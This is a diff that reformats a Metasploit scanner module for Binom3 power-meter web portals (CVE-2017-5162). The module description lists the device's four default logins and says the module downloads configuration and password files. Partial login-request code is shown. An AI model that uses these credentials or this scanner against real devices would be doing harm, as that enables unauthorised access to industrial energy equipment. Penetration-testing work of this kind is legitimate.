@@ -9,28 +9,34 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name' => 'Binom3 Web Management Login Scanner, Config and Password File Dump',
-      'Description' => %{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Binom3 Web Management Login Scanner, Config and Password File Dump',
+        'Description' => %q{
           This module scans for Binom3 Multifunctional Revenue Energy Meter and Power Quality Analyzer
           management login portal(s), and attempts to identify valid credentials.
           There are four (4) default accounts - 'root'/'root', 'admin'/'1', 'alg'/'1', 'user'/'1'.
           In addition to device config, 'root' user can also access password file.
           Other users - admin, alg, user - can only access configuration file.
           The module attempts to download configuration and password files depending on the login user credentials found.
-      },
-      'References' =>
-        [
+        },
+        'References' => [
           ['URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-17-031-01A'],
           ['CVE', '2017-5162']
         ],
-      'Author' =>
-        [
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'License' => MSF_LICENSE,
-      'DefaultOptions' => { 'VERBOSE' => true })
+        'License' => MSF_LICENSE,
+        'DefaultOptions' => { 'VERBOSE' => true },
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
     )
 
     register_options(
@@ -114,7 +120,6 @@ class MetasploitModule < Msf::Auxiliary
   def do_login(user, pass)
     print_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
     begin
-
       res = send_request_cgi(
         {
           'uri' => '/~login',
@@ -127,12 +132,9 @@ class MetasploitModule < Msf::Auxiliary
             }
         }
       )
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-
       vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
       return :abort
-
     end
 
     if (res && res.code == 302 && res.get_cookies.include?('IDSESSION'))
